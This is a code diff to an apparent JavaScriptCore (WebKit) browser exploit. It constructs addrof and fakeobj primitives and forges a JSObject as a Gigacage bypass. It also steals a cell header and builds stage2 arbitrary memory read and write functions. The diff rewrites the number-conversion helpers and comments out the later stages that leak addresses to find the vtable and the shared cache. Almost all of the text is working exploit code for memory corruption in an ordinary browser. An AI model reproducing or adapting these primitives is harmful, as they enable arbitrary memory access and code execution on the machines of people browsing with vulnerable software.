@@ -478,11 +478,11 @@ for (var i = 0; i < 1000; ++i) {
         // temporary implementations
         addrof = (val) => {
           b1[0] = val;
-          return floatAsQword(a1[offset]);
+          return new Int64.fromDouble(a1[offset]);
         }
         fakeobj = (addr) => {
           a1[offset] = qwordAsFloat(addr);
-          return b1[0];
+          return new Int64(b1[0]).asDouble();
         }
         var victim1 = structure_spray[510];
         // Gigacage bypass: Forge a JSObject which has its butterfly pointing
@@ -491,8 +491,8 @@ for (var i = 0; i < 1000; ++i) {
         var print = (msg) => {
           port.postMessage(msg);
         }
-        print("unboxed @ " + hex1(addrof(unboxed1)));
-        print("boxed @ " + hex1(addrof(boxed1)));
+        print("unboxed @ " + addrof(unboxed1));
+        print("boxed @ " + addrof(boxed1));
 
     var container = {
         header: qwordAsTagged(0x0108230900000000), // cell
@@ -523,7 +523,7 @@ for (var i = 0; i < 1000; ++i) {
         results.push(a[0]);
     }
     jscell_header = results[0];
-    print("Stolen Real Cell Header: " + hex1(floatAsQword(js_header)))
+    print("Stolen Real Cell Header: " + new Int64.fromDouble(js_header))
       
     var stage2 = {
         addrof: function(obj) {
@@ -535,8 +535,8 @@ for (var i = 0; i < 1000; ++i) {
         },
 
         write64: function(where, what) {
-            hax[1] = qwordAsFloat(where + 0x10);
-            victim1.prop = this.fakeobj(qwordAsFloat(what));
+            hax[1] = new Int64(where + 0x10).asDouble();
+            victim1.prop = this.fakeobj(new Int64(what).asDouble());
         },
 
         read64: function(where,offset) {
@@ -545,7 +545,7 @@ for (var i = 0; i < 1000; ++i) {
                 offset *= 8
                 return this.read64(where+offset);
             }
-            hax[1] = qwordAsFloat(where + 0x10);
+            hax[1] = new Int64(where + 0x10).asDouble();
             var res = this.addrof(victim1.prop);
             //hax[1] = reset;
             //victim1.prop = shared_butterfly;
@@ -553,7 +553,7 @@ for (var i = 0; i < 1000; ++i) {
         },
         readInt64: function(where) {
             //var reset = hax[1];
-            hax[1] = qwordAsFloat(where + 0x10);
+            hax[1] = new Int64(where + 0x10).asDouble();
             var res = this.addrof(victim1.prop);
             //hax[1] = reset;
             //victim1.prop = shared_butterfly;
@@ -576,13 +576,13 @@ for (var i = 0; i < 1000; ++i) {
             var v;
 
             for (i = 0; i + 8 < length; i += 8) {
-                v = new Int64(this.read64(addr + i)).bytes()
+                v = this.read64(addr + i).bytes()
                 for (var j = 0; j < 8; j++) {
                     a[i+j] = v[j];
                 }
             }
 
-            v = new Int64(this.read64(addr + i)).bytes()
+            v = this.read64(addr + i).bytes()
             for (var j = i; j < length; j++) {
                 a[j] = v[j - i];
             }
@@ -626,8 +626,8 @@ for (var i = 0; i < 1000; ++i) {
     var bb = {};
         //bb[0] = 1.1
         var bbaddr = stage2.addrof(bb);
-        print("object address @ " + hex1(bbaddr));
-        var footeraddr = ((bbaddr & 0xffffc000) + (((bbaddr/0x100000000)|0)*0x100000000)+0x4000-0x130) 
+        print("object address @ " + bbaddr);
+        /*var footeraddr = ((bbaddr & 0xffffc000) + (((bbaddr/0x100000000)|0)*0x100000000)+0x4000-0x130) 
         //refer to VM.h this is
         //JSC::MarkedBlock::footer at offset 8 should be the vm struct
         print("footeraddr @ " + hex1(footeraddr));
@@ -641,11 +641,11 @@ for (var i = 0; i < 1000; ++i) {
         //at offset 0 of m_runloop should be a vtable  :) should sit within the shared cache
         var vtable = stage2.read64(m_runloop);
         print("vtable @ " + hex1(vtable));
-	var anchor = stage2.read64(vtable);
-	let split = new Uint32Array(2);
-	split = anchor
-	var hdr = split[1] - (split[1] & 0xfff);
-	print("header @ " + hex1(hdr))
+	var anchor = stage2.read64(vtable);*/
+	//let split = new Uint32Array(2);
+	//split = anchor
+	//var hdr = split[1] - (split[1] & 0xfff);
+	//print("header @ " + hex1(hdr))
 	//var vtabledump = stage2.read(vtable,0x60);
 	//print("dump" + hexdump(vtabledump));
 	//stage2.write64(hex1(vtable),0x7777);
